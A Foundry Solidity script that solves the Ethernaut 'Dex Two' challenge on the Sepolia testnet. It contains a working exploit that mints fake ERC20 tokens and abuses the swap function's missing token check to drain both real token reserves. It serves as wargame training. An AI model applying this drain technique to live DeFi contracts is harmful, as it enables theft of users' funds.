// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";

import {DexTwo} from "../src/DexTwo.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/DexTwo.s.sol --tc DexTwoSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract DexTwoSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = vm.envAddress("DEX_TWO_INSTANCE");
    // get the owner address
    address public myAddress = vm.envAddress("MY_ADDRESS");

    // attack idea: The Dex Two is very similar to the Dex contract, the objective is to drain both tokens in this challenge
    // notice that the swap function in the DexTwo contract does not check if the tokens are the same as the contract tokens
    // this means that we can swap any token with any other token, we create a new token and deposit it into the contract

    // remember that the price of the swap is calculated by the getSwapAmount function
    // amountOut = (amountIn * reserveOut) / reserveIn
    // we can create a erc20 token deposit 1 token into the contract
    // since the reserve is 1 - 100 we can swap 1 token for 100 token
    // we can repeat this process until we drain both tokens

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        DexTwo dex2Instance = DexTwo(instance);
        address token1 = dex2Instance.token1();
        address token2 = dex2Instance.token2();
        // approve the contract to spend the tokens
        dex2Instance.approve(instance, type(uint256).max);

        // create a fake erc20 token
        FakeERC20 fakeToken1 = new FakeERC20("FakeToken", "FTK", 2);
        // approve the contract to spend the tokens when we call the swap function
        fakeToken1.approve(instance, type(uint256).max);

        // Get the reserves and user balances
        uint256 token1Reserve = dex2Instance.balanceOf(token1, instance);
        uint256 token2Reserve = dex2Instance.balanceOf(token2, instance);
        uint256 userToken1Balance = dex2Instance.balanceOf(token1, myAddress);
        uint256 userToken2Balance = dex2Instance.balanceOf(token2, myAddress);

        console.log("Token1 Reserve: ", token1Reserve);
        console.log("Token2 Reserve: ", token2Reserve);
        console.log("User Token1 Balance: ", userToken1Balance);
        console.log("User Token2 Balance: ", userToken2Balance);
        
        // deposit 1 fake token into the contract
        fakeToken1.transfer(instance, 1);
        // swap the fake token for token1
        dex2Instance.swap(address(fakeToken1), token1, 1);
        // make a second fake token
        FakeERC20 fakeToken2 = new FakeERC20("FakeToken2", "FTK2", 2);
        // approve the contract to spend the tokens when we call the swap function
        fakeToken2.approve(instance, type(uint256).max);

        // deposit 1 fake token into the contract
        fakeToken2.transfer(instance, 1);
        // swap the fake token for token2
        dex2Instance.swap(address(fakeToken2), token2, 1);

        // get the reserves and user balances
        token1Reserve = dex2Instance.balanceOf(token1, instance);
        token2Reserve = dex2Instance.balanceOf(token2, instance);
        userToken1Balance = dex2Instance.balanceOf(token1, myAddress);
        userToken2Balance = dex2Instance.balanceOf(token2, myAddress);

        console.log("After swap");
        console.log("Token1 Reserve: ", token1Reserve);
        console.log("Token2 Reserve: ", token2Reserve);
        console.log("User Token1 Balance: ", userToken1Balance);
        console.log("User Token2 Balance: ", userToken2Balance);

        vm.stopBroadcast();
    }
}

// we will create a fake erc20 token to deposit into the contract and drain the tokens
contract FakeERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }

}